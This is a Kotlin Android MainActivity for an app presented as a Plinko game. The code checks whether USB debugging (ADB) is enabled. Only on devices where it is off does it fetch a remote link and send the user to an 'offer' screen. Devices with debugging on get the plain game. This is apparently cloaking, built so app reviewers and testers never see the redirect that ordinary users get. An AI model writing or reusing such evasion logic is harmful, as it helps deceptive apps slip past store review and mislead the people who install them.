package app.plinko.masterplay

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.view.View
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.activity.viewModels
import androidx.lifecycle.lifecycleScope
import app.plinko.masterplay.data.DataManager
import app.plinko.masterplay.ui.theme.NavigationRoutes
import app.plinko.masterplay.ui.theme.PlinkoMasterPlayTheme
import app.plinko.masterplay.vm.NavigationViewModel
import kotlinx.coroutines.launch

class MainActivity : ComponentActivity() {


    private val navigationViewModel by viewModels<NavigationViewModel>()
    val requestPermissionLauncher = registerForActivityResult(ActivityResultContracts.RequestPermission()) {
        //do some work
    }
    private lateinit var sp: SharedPreferences

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        window.decorView.systemUiVisibility = View.SYSTEM_UI_FLAG_FULLSCREEN


        sp = getSharedPreferences(Const.SP, Context.MODE_PRIVATE)
        val savedData = sp.getString(Const.CURRENT_DATA, Const.EMPTY) ?: Const.EMPTY
        val adb = Settings.Global.getString(contentResolver, Settings.Global.ADB_ENABLED)



        if (savedData == Const.WARNING){

            setContent {
                PlinkoMasterPlayTheme {
                    // A surface container using the 'background' color from the theme
                    NavigationRoutes(2500)
                }
            }
        } else if (savedData == Const.EMPTY && adb == "0"){
            firstTime()
            askPermission()

            setContent {
                PlinkoMasterPlayTheme {
                    // A surface container using the 'background' color from the theme
                    NavigationRoutes(5500)
                }
            }

        } else {
            goToOffer(savedData)
        }
    }

    private fun askPermission(){
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            val permission = android.Manifest.permission.POST_NOTIFICATIONS
            if (checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED) {
                //do some work
            } else requestPermissionLauncher.launch(permission)
        } else {
            //do some work
        }
    }

    private fun firstTime() {

        val intent = Intent(this, StatisticActivity::class.java)
        val dataManager = DataManager(this, navigationViewModel)

        navigationViewModel.link.observe(this){
            if (it != Const.EMPTY){
                intent.putExtra(Const.TARGET, it)
                startActivity(intent)
            }
        }

        lifecycleScope.launch {
            //requst apps and deeplink and open
            dataManager.initDataManager()
        }
    }

    private fun goToOffer(link: String){
        val intentToOffer = Intent(this, StatisticActivity::class.java)
        intentToOffer.putExtra(Const.TARGET, link)
        startActivity(intentToOffer)
    }
}
